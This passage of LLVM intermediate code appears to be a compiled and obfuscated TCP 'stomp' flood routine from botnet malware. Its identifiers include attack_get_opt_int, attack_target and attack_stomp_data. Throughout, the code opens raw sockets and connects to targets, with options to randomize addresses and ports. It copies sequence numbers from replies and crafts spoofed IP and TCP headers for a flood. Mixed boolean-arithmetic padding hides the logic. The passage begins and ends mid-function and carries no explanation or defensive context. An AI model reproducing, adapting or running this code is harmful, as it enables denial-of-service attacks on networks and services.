  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %886

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %886

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %747, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %754

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %742, %728, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %747

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = and i32 %128, 2048
  %130 = xor i32 %128, 2048
  %131 = or i32 %129, %130
  %132 = or i32 %128, 2048
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %131)
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %134, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %141, 32
  br i1 %142, label %143, label %167

; <label>:143:                                    ; preds = %125
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @ntohl(i32 %149) #7
  %151 = call i32 @rand_next()
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 2
  %157 = load i8, i8* %156, align 4
  %158 = zext i8 %157 to i32
  %159 = lshr i32 %151, %158
  %160 = sub i32 %150, 1337315909
  %161 = add i32 %160, %159
  %162 = add i32 %161, 1337315909
  %163 = add i32 %150, %159
  %164 = call i32 @htonl(i32 %162) #7
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %166 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %165, i32 0, i32 0
  store i32 %164, i32* %166, align 4
  br label %176

; <label>:167:                                    ; preds = %125
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 %173, i32* %175, align 4
  br label %176

; <label>:176:                                    ; preds = %167, %143
  %177 = load i16, i16* %17, align 2
  %178 = zext i16 %177 to i32
  %179 = icmp eq i32 %178, 65535
  br i1 %179, label %180, label %192

; <label>:180:                                    ; preds = %176
  %181 = call i32 @rand_next()
  %182 = xor i32 %181, -1
  %183 = xor i32 65535, -1
  %184 = xor i32 -1720331429, -1
  %185 = or i32 %182, %183
  %186 = or i32 -1720331429, %184
  %187 = xor i32 %185, -1
  %188 = and i32 %187, %186
  %189 = and i32 %181, 65535
  %190 = trunc i32 %188 to i16
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %190, i16* %191, align 2
  br label %196

; <label>:192:                                    ; preds = %176
  %193 = load i16, i16* %17, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %194, i16* %195, align 2
  br label %196

; <label>:196:                                    ; preds = %192, %180
  %197 = load i32, i32* %26, align 4
  %198 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %199 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %199, %struct.sockaddr** %198, align 8
  %200 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %201 = load %struct.sockaddr*, %struct.sockaddr** %200, align 8
  %202 = call i32 @connect(i32 %197, %struct.sockaddr* %201, i32 16)
  %203 = call i64 @time(i64* null) #6
  store i64 %203, i64* %31, align 8
  br label %204

; <label>:204:                                    ; preds = %745, %196
  store i32 16, i32* %29, align 4
  %205 = load i32, i32* %10, align 4
  %206 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %207 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %208 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %208, %struct.sockaddr** %207, align 8
  %209 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %210 = load %struct.sockaddr*, %struct.sockaddr** %209, align 8
  %211 = call i64 @recvfrom(i32 %205, i8* %206, i64 256, i32 16384, %struct.sockaddr* %210, i32* %29)
  %212 = trunc i64 %211 to i32
  store i32 %212, i32* %33, align 4
  %213 = load i32, i32* %33, align 4
  %214 = icmp eq i32 %213, -1
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %204
  br label %886

; <label>:216:                                    ; preds = %204
  %217 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %218 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 4
  %220 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %221 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 4
  %223 = icmp eq i32 %219, %222
  br i1 %223, label %224, label %734

; <label>:224:                                    ; preds = %216
  %225 = load i32, i32* %33, align 4
  %226 = sext i32 %225 to i64
  %227 = icmp ugt i64 %226, 40
  br i1 %227, label %228, label %734

; <label>:228:                                    ; preds = %224
  %229 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %230 = getelementptr inbounds i8, i8* %229, i64 20
  %231 = bitcast i8* %230 to %struct.tcphdr*
  store %struct.tcphdr* %231, %struct.tcphdr** %35, align 8
  %232 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = load i16, i16* %233, align 4
  %235 = zext i16 %234 to i32
  %236 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %237 = load i16, i16* %236, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %235, %238
  br i1 %239, label %240, label %733

; <label>:240:                                    ; preds = %228
  %241 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = lshr i16 %243, 9
  %245 = xor i16 1, -1
  %246 = xor i16 %244, %245
  %247 = and i16 %246, %244
  %248 = and i16 %244, 1
  %249 = zext i16 %247 to i32
  %250 = icmp ne i32 %249, 0
  br i1 %250, label %251, label %698

; <label>:251:                                    ; preds = %240
  %252 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = lshr i16 %254, 12
  %256 = xor i16 %255, -1
  %257 = xor i16 1, -1
  %258 = xor i16 -28874, -1
  %259 = or i16 %256, %257
  %260 = or i16 -28874, %258
  %261 = xor i16 %259, -1
  %262 = and i16 %261, %260
  %263 = and i16 %255, 1
  %264 = zext i16 %262 to i32
  %265 = icmp ne i32 %264, 0
  br i1 %265, label %266, label %698

; <label>:266:                                    ; preds = %251
  %267 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %268 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %267, i32 0, i32 0
  %269 = load i32, i32* %268, align 4
  %270 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %271 = load i32, i32* %9, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %270, i64 %272
  %274 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %273, i32 0, i32 0
  store i32 %269, i32* %274, align 4
  %275 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %276 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %275, i32 0, i32 2
  %277 = load i32, i32* %276, align 4
  %278 = call i32 @ntohl(i32 %277) #7
  %279 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %280 = load i32, i32* %9, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %279, i64 %281
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %282, i32 0, i32 1
  store i32 %278, i32* %283, align 4
  %284 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %285 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %284, i32 0, i32 3
  %286 = load i32, i32* %285, align 4
  %287 = call i32 @ntohl(i32 %286) #7
  %288 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %291, i32 0, i32 2
  store i32 %287, i32* %292, align 4
  %293 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 1
  %295 = load i16, i16* %294, align 2
  %296 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %299, i32 0, i32 3
  store i16 %295, i16* %300, align 4
  %301 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %302 = load i16, i16* %301, align 2
  %303 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %304 = load i32, i32* %9, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %303, i64 %305
  %307 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %306, i32 0, i32 4
  store i16 %302, i16* %307, align 2
  %308 = load i32, i32* %24, align 4
  %309 = sext i32 %308 to i64
  %310 = sub i64 0, 40
  %311 = sub i64 0, %309
  %312 = add i64 %310, %311
  %313 = sub i64 0, %312
  %314 = add i64 40, %309
  %315 = call noalias i8* @malloc(i64 %313) #6
  %316 = load i8**, i8*** %12, align 8
  %317 = load i32, i32* %9, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds i8*, i8** %316, i64 %318
  store i8* %315, i8** %319, align 8
  %320 = load i8**, i8*** %12, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds i8*, i8** %320, i64 %322
  %324 = load i8*, i8** %323, align 8
  %325 = bitcast i8* %324 to %struct.iphdr*
  store %struct.iphdr* %325, %struct.iphdr** %36, align 8
  %326 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %327 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %326, i64 1
  %328 = bitcast %struct.iphdr* %327 to %struct.tcphdr*
  store %struct.tcphdr* %328, %struct.tcphdr** %37, align 8
  %329 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %330 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %329, i64 1
  %331 = bitcast %struct.tcphdr* %330 to i8*
  store i8* %331, i8** %38, align 8
  %332 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %333 = bitcast %struct.iphdr* %332 to i8*
  %334 = load i8, i8* %333, align 4
  %335 = xor i8 %334, -1
  %336 = xor i8 15, -1
  %337 = xor i8 32, -1
  %338 = or i8 %335, %336
  %339 = or i8 32, %337
  %340 = xor i8 %338, -1
  %341 = and i8 %340, %339
  %342 = and i8 %334, 15
  %343 = xor i8 %341, -1
  %344 = xor i8 64, -1
  %345 = xor i8 -22, -1
  %346 = and i8 %343, -22
  %347 = and i8 %341, %345
  %348 = and i8 %344, -22
  %349 = and i8 64, %345
  %350 = or i8 %346, %347
  %351 = or i8 %348, %349
  %352 = xor i8 %350, %351
  %353 = or i8 %343, %344
  %354 = xor i8 %353, -1
  %355 = or i8 -22, %345
  %356 = and i8 %354, %355
  %357 = or i8 %352, %356
  %358 = or i8 %341, 64
  store i8 %357, i8* %333, align 4
  %359 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %360 = bitcast %struct.iphdr* %359 to i8*
  %361 = load i8, i8* %360, align 4
  %362 = xor i8 -16, -1
  %363 = xor i8 %361, %362
  %364 = and i8 %363, %361
  %365 = and i8 %361, -16
  %366 = xor i8 %364, -1
  %367 = xor i8 5, -1
  %368 = xor i8 -112, -1
  %369 = and i8 %366, -112
  %370 = and i8 %364, %368
  %371 = and i8 %367, -112
  %372 = and i8 5, %368
  %373 = or i8 %369, %370
  %374 = or i8 %371, %372
  %375 = xor i8 %373, %374
  %376 = or i8 %366, %367
  %377 = xor i8 %376, -1
  %378 = or i8 -112, %368
  %379 = and i8 %377, %378
  %380 = or i8 %375, %379
  %381 = or i8 %364, 5
  store i8 %380, i8* %360, align 4
  %382 = load i8, i8* %13, align 1
  %383 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 1
  store i8 %382, i8* %384, align 1
  %385 = load i32, i32* %24, align 4
  %386 = sext i32 %385 to i64
  %387 = sub i64 0, 40
  %388 = sub i64 0, %386
  %389 = add i64 %387, %388
  %390 = sub i64 0, %389
  %391 = add i64 40, %386
  %392 = trunc i64 %390 to i16
  %393 = call zeroext i16 @htons(i16 zeroext %392) #7
  %394 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %394, i32 0, i32 2
  store i16 %393, i16* %395, align 2
  %396 = load i16, i16* %14, align 2
  %397 = call zeroext i16 @htons(i16 zeroext %396) #7
  %398 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 3
  store i16 %397, i16* %399, align 4
  %400 = load i8, i8* %15, align 1
  %401 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 5
  store i8 %400, i8* %402, align 4
  %403 = load i8, i8* %16, align 1
  %404 = icmp ne i8 %403, 0
  br i1 %404, label %405, label %409

; <label>:405:                                    ; preds = %266
  %406 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %407 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 4
  store i16 %406, i16* %408, align 2
  br label %409

; <label>:409:                                    ; preds = %405, %266
  %410 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 6
  store i8 6, i8* %411, align 1
  %412 = load i32, i32* @LOCAL_ADDR, align 4
  %413 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 8
  store i32 %412, i32* %414, align 4
  %415 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %416 = load i32, i32* %9, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %415, i64 %417
  %419 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %418, i32 0, i32 0
  %420 = load i32, i32* %419, align 4
  %421 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 9
  store i32 %420, i32* %422, align 4
  %423 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %424 = load i32, i32* %9, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %423, i64 %425
  %427 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %426, i32 0, i32 3
  %428 = load i16, i16* %427, align 4
  %429 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %430 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %429, i32 0, i32 0
  store i16 %428, i16* %430, align 4
  %431 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %432 = load i32, i32* %9, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %434, i32 0, i32 4
  %436 = load i16, i16* %435, align 2
  %437 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 1
  store i16 %436, i16* %438, align 2
  %439 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %440 = load i32, i32* %9, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %439, i64 %441
  %443 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %442, i32 0, i32 2
  %444 = load i32, i32* %443, align 4
  %445 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %446 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %445, i32 0, i32 2
  store i32 %444, i32* %446, align 4
  %447 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %450, i32 0, i32 1
  %452 = load i32, i32* %451, align 4
  %453 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %454 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %453, i32 0, i32 3
  store i32 %452, i32* %454, align 4
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = xor i16 %457, -1
  %459 = xor i16 -241, -1
  %460 = xor i16 5007, -1
  %461 = or i16 %458, %459
  %462 = or i16 5007, %460
  %463 = xor i16 %461, -1
  %464 = and i16 %463, %462
  %465 = and i16 %457, -241
  %466 = and i16 %464, 128
  %467 = xor i16 %464, 128
  %468 = or i16 %466, %467
  %469 = or i16 %464, 128
  store i16 %468, i16* %456, align 4
  %470 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %471 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %470, i32 0, i32 4
  %472 = load i16, i16* %471, align 4
  %473 = xor i16 -257, -1
  %474 = xor i16 %472, %473
  %475 = and i16 %474, %472
  %476 = and i16 %472, -257
  %477 = and i16 %475, 256
  %478 = xor i16 %475, 256
  %479 = or i16 %477, %478
  %480 = or i16 %475, 256
  store i16 %479, i16* %471, align 4
  %481 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %482 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %481, i32 0, i32 4
  %483 = load i16, i16* %482, align 4
  %484 = xor i16 -4097, -1
  %485 = xor i16 %483, %484
  %486 = and i16 %485, %483
  %487 = and i16 %483, -4097
  %488 = xor i16 %486, -1
  %489 = xor i16 4096, -1
  %490 = xor i16 30550, -1
  %491 = and i16 %488, 30550
  %492 = and i16 %486, %490
  %493 = and i16 %489, 30550
  %494 = and i16 4096, %490
  %495 = or i16 %491, %492
  %496 = or i16 %493, %494
  %497 = xor i16 %495, %496
  %498 = or i16 %488, %489
  %499 = xor i16 %498, -1
  %500 = or i16 30550, %490
  %501 = and i16 %499, %500
  %502 = or i16 %497, %501
  %503 = or i16 %486, 4096
  store i16 %502, i16* %482, align 4
  %504 = call i32 @rand_next()
  %505 = xor i32 65535, -1
  %506 = xor i32 %504, %505
  %507 = and i32 %506, %504
  %508 = and i32 %504, 65535
  %509 = trunc i32 %507 to i16
  %510 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 5
  store i16 %509, i16* %511, align 2
  %512 = load i8, i8* %18, align 1
  %513 = sext i8 %512 to i16
  %514 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 4
  %516 = load i16, i16* %515, align 4
  %517 = xor i16 1, -1
  %518 = xor i16 %513, %517
  %519 = and i16 %518, %513
  %520 = and i16 %513, 1
  %521 = shl i16 %519, 13
  %522 = xor i16 -8193, -1
  %523 = xor i16 %516, %522
  %524 = and i16 %523, %516
  %525 = and i16 %516, -8193
  %526 = xor i16 %524, -1
  %527 = xor i16 %521, -1
  %528 = xor i16 -6756, -1
  %529 = and i16 %526, -6756
  %530 = and i16 %524, %528
  %531 = and i16 %527, -6756
  %532 = and i16 %521, %528
  %533 = or i16 %529, %530
  %534 = or i16 %531, %532
  %535 = xor i16 %533, %534
  %536 = or i16 %526, %527
  %537 = xor i16 %536, -1
  %538 = or i16 -6756, %528
  %539 = and i16 %537, %538
  %540 = or i16 %535, %539
  %541 = or i16 %524, %521
  store i16 %540, i16* %515, align 4
  %542 = load i8, i8* %19, align 1
  %543 = sext i8 %542 to i16
  %544 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %545 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %544, i32 0, i32 4
  %546 = load i16, i16* %545, align 4
  %547 = xor i16 1, -1
  %548 = xor i16 %543, %547
  %549 = and i16 %548, %543
  %550 = and i16 %543, 1
  %551 = shl i16 %549, 12
  %552 = xor i16 -4097, -1
  %553 = xor i16 %546, %552
  %554 = and i16 %553, %546
  %555 = and i16 %546, -4097
  %556 = xor i16 %554, -1
  %557 = xor i16 %551, -1
  %558 = xor i16 -16169, -1
  %559 = and i16 %556, -16169
  %560 = and i16 %554, %558
  %561 = and i16 %557, -16169
  %562 = and i16 %551, %558
  %563 = or i16 %559, %560
  %564 = or i16 %561, %562
  %565 = xor i16 %563, %564
  %566 = or i16 %556, %557
  %567 = xor i16 %566, -1
  %568 = or i16 -16169, %558
  %569 = and i16 %567, %568
  %570 = or i16 %565, %569
  %571 = or i16 %554, %551
  store i16 %570, i16* %545, align 4
  %572 = load i8, i8* %20, align 1
  %573 = sext i8 %572 to i16
  %574 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %575 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %574, i32 0, i32 4
  %576 = load i16, i16* %575, align 4
  %577 = xor i16 1, -1
  %578 = xor i16 %573, %577
  %579 = and i16 %578, %573
  %580 = and i16 %573, 1
  %581 = shl i16 %579, 11
  %582 = xor i16 %576, -1
  %583 = xor i16 -2049, -1
  %584 = xor i16 -13391, -1
  %585 = or i16 %582, %583
  %586 = or i16 -13391, %584
  %587 = xor i16 %585, -1
  %588 = and i16 %587, %586
  %589 = and i16 %576, -2049
  %590 = xor i16 %588, -1
  %591 = xor i16 %581, -1
  %592 = xor i16 15593, -1
  %593 = and i16 %590, 15593
  %594 = and i16 %588, %592
  %595 = and i16 %591, 15593
  %596 = and i16 %581, %592
  %597 = or i16 %593, %594
  %598 = or i16 %595, %596
  %599 = xor i16 %597, %598
  %600 = or i16 %590, %591
  %601 = xor i16 %600, -1
  %602 = or i16 15593, %592
  %603 = and i16 %601, %602
  %604 = or i16 %599, %603
  %605 = or i16 %588, %581
  store i16 %604, i16* %575, align 4
  %606 = load i8, i8* %21, align 1
  %607 = sext i8 %606 to i16
  %608 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %609 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %608, i32 0, i32 4
  %610 = load i16, i16* %609, align 4
